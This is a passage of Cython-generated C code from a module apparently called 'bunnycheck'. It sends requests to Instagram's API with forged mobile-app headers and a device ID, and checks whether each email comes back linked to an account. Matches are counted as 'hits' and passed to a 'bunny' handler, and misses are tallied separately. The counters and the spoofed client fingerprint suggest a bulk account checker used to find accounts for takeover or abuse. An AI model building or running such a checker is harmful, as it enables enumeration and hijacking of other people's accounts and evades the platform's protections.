            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
        __Pyx_GIVEREF(__pyx_t_7);
        PyTuple_SET_ITEM(__pyx_t_2, 9, __pyx_t_7);
        __pyx_t_7 = 0;
        __Pyx_INCREF(__pyx_kp_u_22_2C_22device_id_22_3A_22);
        __pyx_t_5 += 27;
        __Pyx_GIVEREF(__pyx_kp_u_22_2C_22device_id_22_3A_22);
        PyTuple_SET_ITEM(__pyx_t_2, 10, __pyx_kp_u_22_2C_22device_id_22_3A_22);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_variable_instance, __pyx_n_s_android_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_2, 11, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_22_2C_22directly_sign_in_22_3A);
        __pyx_t_5 += 65;
        __Pyx_GIVEREF(__pyx_kp_u_22_2C_22directly_sign_in_22_3A);
        PyTuple_SET_ITEM(__pyx_t_2, 12, __pyx_kp_u_22_2C_22directly_sign_in_22_3A);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_2, 13, __pyx_t_5, __pyx_t_21); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_v_payload = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(15); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 542, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = __pyx_pf_6source_10bunnycheck_bunny_user_agent(__pyx_v_bunny_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 542, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_t_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_uuid); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 545, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 545, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 545, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 545, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Session_Id, __pyx_t_1) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_3f, __pyx_n_s_format); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 546, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_time); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 546, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_7 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 546, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 546, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 546, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_t_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Speed, __pyx_kp_u_1kbps) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_kp_u_1_000) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Bloks_Version_Id, __pyx_kp_u_009f03b18280bb343b0862d663f31ac8) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Type, __pyx_kp_u_MOBILE_LTE_2) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Capabilities, __pyx_kp_u_3brTvw) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_App_ID, __pyx_kp_u_567067343352427) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_ar_YE_en_US) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_FB_HTTP_Engine, __pyx_n_u_Liger) < 0) __PYX_ERR(0, 542, __pyx_L9_error)
        __pyx_v_headers = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 557, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 557, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_payload) < 0) __PYX_ERR(0, 557, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 557, __pyx_L9_error)
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_4, __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 557, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 557, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_v_res = __pyx_t_1;
        __pyx_t_1 = 0;

        
        __pyx_t_14 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_status_ok, __pyx_v_res, Py_EQ)); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 558, __pyx_L9_error)
        __pyx_t_22 = (__pyx_t_14 != 0);
        if (__pyx_t_22) {
        } else {
          __pyx_t_15 = __pyx_t_22;
          goto __pyx_L52_bool_binop_done;
        }
        __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_v_email, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 558, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_22 = (__Pyx_PySequence_ContainsTF(__pyx_t_1, __pyx_v_res, Py_EQ)); if (unlikely(__pyx_t_22 < 0)) __PYX_ERR(0, 558, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_14 = (__pyx_t_22 != 0);
        __pyx_t_15 = __pyx_t_14;
        __pyx_L52_bool_binop_done:;
        if (__pyx_t_15) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_bunny); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 559, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 559, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L51;
        }

        
        /*else*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 561, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_7 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 561, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_t_7) < 0) __PYX_ERR(0, 561, __pyx_L9_error)
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __pyx_L51:;

        
      }
      __pyx_L15:;

      
    }
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    goto __pyx_L14_try_end;
    __pyx_L9_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_19 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_19) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L10_exception_handled;
    }
    goto __pyx_L11_except_error;
    __pyx_L11_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_XGIVEREF(__pyx_t_13);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
    goto __pyx_L1_error;
    __pyx_L13_try_return:;
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_XGIVEREF(__pyx_t_13);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
    goto __pyx_L0;
    __pyx_L10_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_XGIVEREF(__pyx_t_13);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
    __pyx_L14_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 564, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 564, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 564, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 564, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_Equals(__pyx_t_8, __pyx_n_u_posix, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 564, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (__pyx_t_15) {
    __Pyx_INCREF(__pyx_n_u_clear);
    __pyx_t_1 = __pyx_n_u_clear;
  } else {
    __Pyx_INCREF(__pyx_n_u_cls);
    __pyx_t_1 = __pyx_n_u_cls;
  }
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_8, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 564, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = PyTuple_New(7); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_5 = 0;
  __pyx_t_21 = 127;
  __Pyx_INCREF(__pyx_kp_u__49);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_5 += 24;
  __Pyx_GIVEREF(__pyx_kp_u__49);
  PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u__49);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_hit_dustu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_21;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__50);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_5 += 14;
  __Pyx_GIVEREF(__pyx_kp_u__50);
  PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u__50);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__51);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_5 += 13;
  __Pyx_GIVEREF(__pyx_kp_u__51);
  PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u__51);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_orta_mail); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_21;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_7, 5, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__52);
  __pyx_t_21 = (65535 > __pyx_t_21) ? 65535 : __pyx_t_21;
  __pyx_t_5 += 17;
  __Pyx_GIVEREF(__pyx_kp_u__52);
  PyTuple_SET_ITEM(__pyx_t_7, 6, __pyx_kp_u__52);
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_7, 7, __pyx_t_5, __pyx_t_21); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 565, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("source.bunnycheck", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_Variable);
  __Pyx_XDECREF(__pyx_v_variable_instance);
  __Pyx_XDECREF(__pyx_v_bunny_user_agent);
  __Pyx_XDECREF(__pyx_v_method);
  __Pyx_XDECREF(__pyx_v_csrftoken);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_uui);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_responses);
  __Pyx_XDECREF(__pyx_v_mid);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_v_csrf);
  __Pyx_XDECREF(__pyx_v_ig_did);
  __Pyx_XDECREF(__pyx_v_ig_nrcb);
  __Pyx_XDECREF(__pyx_v_app);
  __Pyx_XDECREF(__pyx_v_response2);
  __Pyx_XDECREF(__pyx_v_payload);
  __Pyx_XDECREF(__pyx_v_response_data);
  __Pyx_XDECREF(__pyx_v_res);
  __Pyx_XDECREF(__pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country);
  __Pyx_XDECREF(__pyx_gb_6source_10bunnycheck_4generator3);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_13bunnymain(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_13bunnymain = {"bunnymain", (PyCFunction)__pyx_pw_6source_13bunnymain, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_13bunnymain(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("bunnymain (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_12bunnymain(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_12bunnymain(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_user_id = NULL;
  PyObject *__pyx_v_rnd = NULL;
  PyObject *__pyx_v_user_agent = NULL;
  PyObject *__pyx_v_lsd = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_response_json = NULL;
  PyObject *__pyx_v_user_data = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_follower_count = NULL;
  PyObject *__pyx_v_media_count = NULL;
  PyObject *__pyx_v_email = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
